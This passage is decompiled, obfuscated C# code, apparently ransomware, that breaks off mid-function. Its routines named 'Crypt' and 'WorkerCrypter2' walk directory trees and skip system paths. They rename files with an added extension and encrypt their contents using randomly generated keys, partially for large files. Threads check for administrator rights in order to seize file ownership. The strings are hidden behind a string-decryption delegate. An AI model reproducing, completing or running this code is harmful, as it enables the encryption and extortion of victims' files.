using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using eZkFrthrrFwCL;
using qKKKydaPmBIOW;

namespace qYAjLWajCJpnf;

internal sealed class bTJSgdVkQM
{
	public sealed class PyeOeBRNGpCRPVMr
	{
		private static StringCollection DsAaLepJgug;

		private static List<string> FfUmfwHIGixi;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107459817));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107459812)) && !text.ToLower().Contains(getString_0(107459791)) && !text.ToLower().Contains(getString_0(107349964)) && !text.ToLower().Contains(getString_0(107349919)) && !text.ToLower().Contains(getString_0(107459746)) && !text.ToLower().Contains(getString_0(107349291)) && !text.ToLower().Contains(getString_0(107349232)) && !text.ToLower().Contains(getString_0(107349183)) && !text.ToLower().Contains(getString_0(107349198)) && !text.ToLower().Contains(getString_0(107349149)) && !text.ToLower().Contains(getString_0(107349115)) && !text.ToLower().Contains(getString_0(107349130)) && !text.ToLower().Contains(getString_0(107349593)) && !text.ToLower().Contains(getString_0(107349612)) && !text.ToLower().Contains(getString_0(107349559)) && !text.ToLower().Contains(getString_0(107349578)) && !text.ToLower().Contains(getString_0(107349533)) && !text.ToLower().Contains(getString_0(107349548)) && !text.ToLower().Contains(getString_0(107349499)) && !text.Contains(gvCYkntYkqMW(getString_0(107349514))) && !text.Contains(getString_0(107349489)) && !text.Contains(getString_0(107349459)) && !text.EndsWith(getString_0(107395792)) && !text.EndsWith(getString_0(107349402)) && !text.EndsWith(getString_0(107349397)) && !text.EndsWith(getString_0(107349424)) && !text.EndsWith(getString_0(107349419)) && !text.ToLower().Contains(getString_0(107349414)) && !text.ToLower().Contains(ntagmnsgvSkoTT))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(HYSHgMyGCmRaP) * 1024.0 * 1024.0 && txqzvgdCEQF == getString_0(107396930))
							{
								FfUmfwHIGixi.Add(text);
							}
							else if (File.Exists(text) && txqzvgdCEQF == getString_0(107396847))
							{
								FfUmfwHIGixi.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return FfUmfwHIGixi;
		}

		static PyeOeBRNGpCRPVMr()
		{
			Strings.CreateGetStringDelegate(typeof(PyeOeBRNGpCRPVMr));
			DsAaLepJgug = new StringCollection();
			FfUmfwHIGixi = new List<string>();
		}
	}

	private sealed class aaKsyZRyUQczJ
	{
		public string hOGxQHlNgrJ;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == hOGxQHlNgrJ;
		}
	}

	private sealed class RnVSXGpvaRmkK
	{
		public string zLyXgmOylkgYnX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(ywMnaFcwkyBX);
			RSEYqZQHxTlgU.Add(getString_0(107348803) + zLyXgmOylkgYnX + getString_0(107396823) + (char)int_0 + getString_0(107459764));
			try
			{
				if (WmRKwcdDWVtNion)
				{
					Console.WriteLine(getString_0(107348803) + zLyXgmOylkgYnX + getString_0(107396823) + (char)int_0 + getString_0(107459764));
				}
			}
			catch
			{
			}
		}

		static RnVSXGpvaRmkK()
		{
			Strings.CreateGetStringDelegate(typeof(RnVSXGpvaRmkK));
		}
	}

	private sealed class MIYCMGQzHX
	{
		public string IkizUsEYpWGwM;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == IkizUsEYpWGwM;
		}
	}

	private sealed class RyVCddrLRFl
	{
		private sealed class LqeTCRjpNGZeaX
		{
			public RyVCddrLRFl RTdpThbyDRnl;

			public string FYzFmVHDBpSMebb;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					bFzPnDXkjRV(WindowsIdentity.GetCurrent().Name, FYzFmVHDBpSMebb);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				JhydZjHCrfwXm(FYzFmVHDBpSMebb, RTdpThbyDRnl.BnSdRueHezo, RTdpThbyDRnl.gwLOovozMz, RTdpThbyDRnl.ADOCvRsQgZIc, RTdpThbyDRnl.FdoRuIdHkWuYD);
			}
		}

		public string[] BnSdRueHezo;

		public string[] ADOCvRsQgZIc;

		public string FdoRuIdHkWuYD;

		public string gwLOovozMz;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			LqeTCRjpNGZeaX CS_0024_003C_003E8__locals0 = new LqeTCRjpNGZeaX();
			CS_0024_003C_003E8__locals0.RTdpThbyDRnl = this;
			CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb = string_0;
			if (YgToHXrQdwK && !fzBOSVsSHwJOy().Contains(getString_0(107378632)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bFzPnDXkjRV(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (GUXQCPvWRuYo == getString_0(107396939))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					JhydZjHCrfwXm(CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.BnSdRueHezo, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.gwLOovozMz, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.ADOCvRsQgZIc, CS_0024_003C_003E8__locals0.RTdpThbyDRnl.FdoRuIdHkWuYD);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				JhydZjHCrfwXm(CS_0024_003C_003E8__locals0.FYzFmVHDBpSMebb, BnSdRueHezo, gwLOovozMz, ADOCvRsQgZIc, FdoRuIdHkWuYD);
			}
		}

		static RyVCddrLRFl()
		{
			Strings.CreateGetStringDelegate(typeof(RyVCddrLRFl));
		}
	}

	private sealed class QaTaQbhILmx
	{
		private sealed class DYyXKyvgyZFMVsdn
		{
			public QaTaQbhILmx oguYRUacZk;

			public string VHlUNlIwvbXLA;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in WIlNSOXrZeC)
				{
					if (VHlUNlIwvbXLA.ToLower().EndsWith(item + oguYRUacZk.IUsTjCWCoatx) && PIdfVhNVvVogR == getString_0(107396950))
					{
						if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > new FileInfo(VHlUNlIwvbXLA).Length)
						{
							try
							{
								UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350607), getString_0(107350602), getString_0(107350621), VHlUNlIwvbXLA);
							}
							catch
							{
							}
						}
					}
					else if (VHlUNlIwvbXLA.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396867))
					{
						try
						{
							UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350607), getString_0(107350602), getString_0(107350621), VHlUNlIwvbXLA);
						}
						catch
						{
						}
					}
				}
			}

			static DYyXKyvgyZFMVsdn()
			{
				Strings.CreateGetStringDelegate(typeof(DYyXKyvgyZFMVsdn));
			}
		}

		private sealed class OxZrsuqEfySJDo
		{
			public QaTaQbhILmx oguYRUacZk;

			public string BGIywWvGkY;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in WIlNSOXrZeC)
				{
					if (BGIywWvGkY.ToLower().EndsWith(item + oguYRUacZk.IUsTjCWCoatx) && PIdfVhNVvVogR == getString_0(107396953))
					{
						if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > new FileInfo(BGIywWvGkY).Length)
						{
							try
							{
								UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350610), getString_0(107350605), getString_0(107350624), BGIywWvGkY);
							}
							catch
							{
							}
						}
					}
					else if (BGIywWvGkY.ToLower().EndsWith(item) && PIdfVhNVvVogR == getString_0(107396870))
					{
						try
						{
							UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350610), getString_0(107350605), getString_0(107350624), BGIywWvGkY);
						}
						catch
						{
						}
					}
				}
			}

			static OxZrsuqEfySJDo()
			{
				Strings.CreateGetStringDelegate(typeof(OxZrsuqEfySJDo));
			}
		}

		public List<string> ufPqetzKZi;

		public List<string> dDmITDjvmcD;

		public string IUsTjCWCoatx;

		public string[] xzDFOdTpuYCqZ;

		public string ARnvboqDJfB;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			DYyXKyvgyZFMVsdn CS_0024_003C_003E8__locals0;
			foreach (string item in dDmITDjvmcD)
			{
				if (item.Contains(getString_0(107350024)) || item.Contains(getString_0(107349999)) || item.Contains(getString_0(107349966)) || item.ToLower().Contains(getString_0(107349981)) || item.ToLower().Contains(getString_0(107349936)) || item.Contains(getString_0(107349943)) || item.Contains(getString_0(107349922)) || item.ToLower().Contains(getString_0(107349909)) || item.ToLower().Contains(getString_0(107349352)) || item.ToLower().Contains(getString_0(107349347)) || item.ToLower().Contains(getString_0(107349338)) || item.ToLower().Contains(getString_0(107349289)) || item.ToLower().Contains(getString_0(107349263)) || item.ToLower().Contains(getString_0(107349274)) || item.Contains(getString_0(107349249)) || item.Contains(getString_0(107349200)) || item.Contains(getString_0(107349215)) || item.Contains(getString_0(107349166)) || item.Contains(getString_0(107349181)) || item.Contains(getString_0(107349132)) || item.Contains(getString_0(107349147)) || item.Contains(getString_0(107349610)) || item.Contains(getString_0(107349629)) || item.Contains(getString_0(107349576)) || item.ToLower().Contains(getString_0(107349595)) || item.ToLower().Contains(getString_0(107349550)) || item.ToLower().Contains(getString_0(107349565)) || item.ToLower().Contains(getString_0(107349516)) || item.Contains(gvCYkntYkqMW(getString_0(107349531))) || item.Contains(getString_0(107349506)) || item.Contains(getString_0(107349493)) || item.Contains(getString_0(107349476)) || item.EndsWith(IUsTjCWCoatx) || item.EndsWith(getString_0(107349419)) || item.EndsWith(getString_0(107349414)) || item.EndsWith(getString_0(107349441)) || item.EndsWith(getString_0(107349436)) || item.Contains(getString_0(107349431)) || item.Contains(ntagmnsgvSkoTT) || item.Contains(vzSBJQFXpb) || item.Contains(kVZoVJTgfl))
				{
					continue;
				}
				if (xzDFOdTpuYCqZ.Length != 0)
				{
					string[] array = xzDFOdTpuYCqZ;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0c41;
					}
				}
				try
				{
					if (item.EndsWith(IUsTjCWCoatx))
					{
						goto IL_0c41;
					}
				}
				catch (Exception)
				{
					goto IL_0c41;
				}
				if (!item.EndsWith(string_0) || GfJosmTooKpZJP.Contains(item))
				{
					continue;
				}
				if (uvAbidagcyNet == getString_0(107396947))
				{
					try
					{
						if (hvlXQSEyNEuZ.rbQAJqTFuy(item))
						{
							hvlXQSEyNEuZ.mNTXpbqUPeb(item);
						}
					}
					catch
					{
					}
				}
				GfJosmTooKpZJP.Add(item);
				if (!LvCohppTPrblek.Contains(Path.GetDirectoryName(item)))
				{
					LvCohppTPrblek.Add(Path.GetDirectoryName(item));
				}
				LsmwFBnODGufLo(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (JJYUPCZGaGN)
						{
							try
							{
								File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + item + getString_0(107459773) + ex2.Message + getString_0(107397174));
							}
							catch (Exception)
							{
							}
						}
						AmOSyvkYqZhk++;
						goto end_IL_0537;
					}
					if (OKoHtjQYjxHns == getString_0(107396947) && new FileInfo(item).Length > Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024 && !ufPqetzKZi.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new DYyXKyvgyZFMVsdn();
						CS_0024_003C_003E8__locals0.oguYRUacZk = this;
						try
						{
							if (IUsTjCWCoatx != getString_0(107378047))
							{
								if (FAXnWIlLgke)
								{
									IUsTjCWCoatx = IHjeiOieyeiso + IUsTjCWCoatx;
								}
								File.Move(item, item + IUsTjCWCoatx);
							}
						}
						catch (Exception ex4)
						{
							if (JJYUPCZGaGN)
							{
								try
								{
									File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + item + getString_0(107460224) + ex4.Message + getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							AmOSyvkYqZhk++;
							goto end_IL_0537;
						}
						CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA = getString_0(107350555);
						if (IUsTjCWCoatx != getString_0(107378047))
						{
							CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA = item + IUsTjCWCoatx;
						}
						else
						{
							CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA = item;
						}
						if (bdRzRfVgdufg == getString_0(107396947))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in WIlNSOXrZeC)
								{
									if (CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.oguYRUacZk.IUsTjCWCoatx) && PIdfVhNVvVogR == DYyXKyvgyZFMVsdn.getString_0(107396950))
									{
										if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA).Length)
										{
											try
											{
												UuDMKkzrJStt.xLFYxlCXWb(DYyXKyvgyZFMVsdn.getString_0(107350607), DYyXKyvgyZFMVsdn.getString_0(107350602), DYyXKyvgyZFMVsdn.getString_0(107350621), CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA.ToLower().EndsWith(item2) && PIdfVhNVvVogR == DYyXKyvgyZFMVsdn.getString_0(107396867))
									{
										try
										{
											UuDMKkzrJStt.xLFYxlCXWb(DYyXKyvgyZFMVsdn.getString_0(107350607), DYyXKyvgyZFMVsdn.getString_0(107350602), DYyXKyvgyZFMVsdn.getString_0(107350621), CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = auOSwAVUhkz.xXzlwQJswVbf(32);
						string s = RWAKpybrscGjni.tVtoOZjiqyF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (TJlCZFndoKUA == getString_0(107396864))
						{
							byte[] array2 = null;
							byte[] byte_ = YyTkJTBkSaQ.jABPxSWkmiBG(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024);
							if (YyTkJTBkSaQ.asKfRIcataD(MRgSqllkMDRCm: (!iRryUAENoXyxNt) ? (CVCyEBDPJVibYms ? YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (CVCyEBDPJVibYms ? ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IWBmTKARrJCu: CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, CemBOcHEZGvXd: bytes))
							{
								goto IL_0c41;
							}
							try
							{
								File.Move(item + IUsTjCWCoatx, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!CVCyEBDPJVibYms)
						{
							if (moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, PnZVnKFyCNiuKv, ARnvboqDJfB))
							{
								goto IL_0c41;
							}
							try
							{
								File.Move(item + IUsTjCWCoatx, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, PnZVnKFyCNiuKv, text, bytes))
							{
								goto IL_0c41;
							}
							try
							{
								File.Move(item + IUsTjCWCoatx, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (FAXnWIlLgke)
					{
						IUsTjCWCoatx = IHjeiOieyeiso + IUsTjCWCoatx;
					}
					string text2 = auOSwAVUhkz.xXzlwQJswVbf(32);
					string s2 = RWAKpybrscGjni.tVtoOZjiqyF(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (IUsTjCWCoatx != getString_0(107378047))
					{
						if (!DCETDGmAEgibl)
						{
							if (!CVCyEBDPJVibYms)
							{
								qxGcsYEaEgSP(item, item + IUsTjCWCoatx, xdThOOfnYmOX);
							}
							else
							{
								qxGcsYEaEgSP(item, item + IUsTjCWCoatx, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!CVCyEBDPJVibYms)
								{
									plvpumDZMr(item, item + IUsTjCWCoatx, xdThOOfnYmOX);
								}
								else
								{
									plvpumDZMr(item, item + IUsTjCWCoatx, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex9)
							{
								if (JJYUPCZGaGN)
								{
									try
									{
										File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + item + getString_0(107378001) + ex9.Message + getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								AmOSyvkYqZhk++;
								try
								{
									File.Move(item + IUsTjCWCoatx, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0537;
							}
						}
					}
					else if (!DCETDGmAEgibl)
					{
						if (!CVCyEBDPJVibYms)
						{
							qxGcsYEaEgSP(item, item + getString_0(107378042), xdThOOfnYmOX);
						}
						else
						{
							qxGcsYEaEgSP(item, item + getString_0(107378042), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!CVCyEBDPJVibYms)
							{
								plvpumDZMr(item, item, xdThOOfnYmOX);
							}
							else
							{
								plvpumDZMr(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex12)
						{
							if (JJYUPCZGaGN)
							{
								try
								{
									File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + item + getString_0(107378001) + ex12.Message + getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							AmOSyvkYqZhk++;
							goto end_IL_0537;
						}
					}
					if (CVCyEBDPJVibYms)
					{
						if (IUsTjCWCoatx != getString_0(107378047))
						{
							emEmxwYCVRMX(item + IUsTjCWCoatx, bytes2);
						}
						else
						{
							emEmxwYCVRMX(item, bytes2);
						}
					}
					goto IL_0c41;
					end_IL_0537:;
				}
				catch (Exception)
				{
					goto IL_0c41;
				}
				continue;
				IL_0c41:
				dDmITDjvmcD.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			OxZrsuqEfySJDo CS_0024_003C_003E8__locals0 = new OxZrsuqEfySJDo();
			CS_0024_003C_003E8__locals0.oguYRUacZk = this;
			CS_0024_003C_003E8__locals0.BGIywWvGkY = string_0;
			if (!CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107350024)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349999)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349966)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349981)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349936)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349943)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349922)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349909)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349352)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349347)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349338)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349289)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349263)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349274)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349249)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349200)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349215)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349166)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349181)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349132)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349147)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349610)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349629)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349576)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349595)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349550)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349565)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(getString_0(107349516)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(gvCYkntYkqMW(getString_0(107349531))) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349506)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349493)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349476)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(IUsTjCWCoatx) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(getString_0(107349419)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(getString_0(107349414)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(getString_0(107349441)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(getString_0(107349436)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(getString_0(107349431)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(ntagmnsgvSkoTT) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(vzSBJQFXpb) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(kVZoVJTgfl))
			{
				if (xzDFOdTpuYCqZ.Length != 0)
				{
					string[] array = xzDFOdTpuYCqZ;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0df4;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(IUsTjCWCoatx))
					{
						goto IL_0df4;
					}
				}
				catch (Exception)
				{
					goto IL_0df4;
				}
				if (!GfJosmTooKpZJP.Contains(CS_0024_003C_003E8__locals0.BGIywWvGkY))
				{
					if (uvAbidagcyNet == getString_0(107396947))
					{
						try
						{
							if (hvlXQSEyNEuZ.rbQAJqTFuy(CS_0024_003C_003E8__locals0.BGIywWvGkY))
							{
								hvlXQSEyNEuZ.mNTXpbqUPeb(CS_0024_003C_003E8__locals0.BGIywWvGkY);
							}
						}
						catch
						{
						}
					}
					GfJosmTooKpZJP.Add(CS_0024_003C_003E8__locals0.BGIywWvGkY);
					if (!LvCohppTPrblek.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.BGIywWvGkY)))
					{
						LvCohppTPrblek.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.BGIywWvGkY));
					}
					LsmwFBnODGufLo(CS_0024_003C_003E8__locals0.BGIywWvGkY);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.BGIywWvGkY).Length != 0L)
							{
								goto end_IL_0656;
							}
							goto end_IL_0656_2;
							end_IL_0656:;
						}
						catch (Exception ex2)
						{
							if (JJYUPCZGaGN)
							{
								try
								{
									File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + getString_0(107459773) + ex2.Message + getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							AmOSyvkYqZhk++;
							goto end_IL_0656_2;
						}
						if (OKoHtjQYjxHns == getString_0(107396947) && new FileInfo(CS_0024_003C_003E8__locals0.BGIywWvGkY).Length > Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024)
						{
							try
							{
								if (IUsTjCWCoatx != getString_0(107378047))
								{
									if (FAXnWIlLgke)
									{
										IUsTjCWCoatx = IHjeiOieyeiso + IUsTjCWCoatx;
									}
									File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + IUsTjCWCoatx);
								}
							}
							catch (Exception ex4)
							{
								if (JJYUPCZGaGN)
								{
									try
									{
										File.AppendAllText(vzSBJQFXpb, getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + getString_0(107460224) + ex4.Message + getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								AmOSyvkYqZhk++;
								return;
							}
							if (IUsTjCWCoatx != getString_0(107378047))
							{
								CS_0024_003C_003E8__locals0.BGIywWvGkY += IUsTjCWCoatx;
							}
							if (bdRzRfVgdufg == getString_0(107396947))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in WIlNSOXrZeC)
									{
										if (CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.oguYRUacZk.IUsTjCWCoatx) && PIdfVhNVvVogR == OxZrsuqEfySJDo.getString_0(107396953))
										{
											if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BGIywWvGkY).Length)
											{
												try
												{
													UuDMKkzrJStt.xLFYxlCXWb(OxZrsuqEfySJDo.getString_0(107350610), OxZrsuqEfySJDo.getString_0(107350605), OxZrsuqEfySJDo.getString_0(107350624), CS_0024_003C_003E8__locals0.BGIywWvGkY);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().EndsWith(item) && PIdfVhNVvVogR == OxZrsuqEfySJDo.getString_0(107396870))
										{
											try
											{
												UuDMKkzrJStt.xLFYxlCXWb(OxZrsuqEfySJDo.getString_0(107350610), OxZrsuqEfySJDo.getString_0(107350605), OxZrsuqEfySJDo.getString_0(107350624), CS_0024_003C_003E8__locals0.BGIywWvGkY);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = auOSwAVUhkz.xXzlwQJswVbf(32);
							string s = RWAKpybrscGjni.tVtoOZjiqyF(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (TJlCZFndoKUA == getString_0(107396864))
							{
								byte[] array2 = null;
								byte[] byte_ = YyTkJTBkSaQ.jABPxSWkmiBG(CS_0024_003C_003E8__locals0.BGIywWvGkY, Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024);
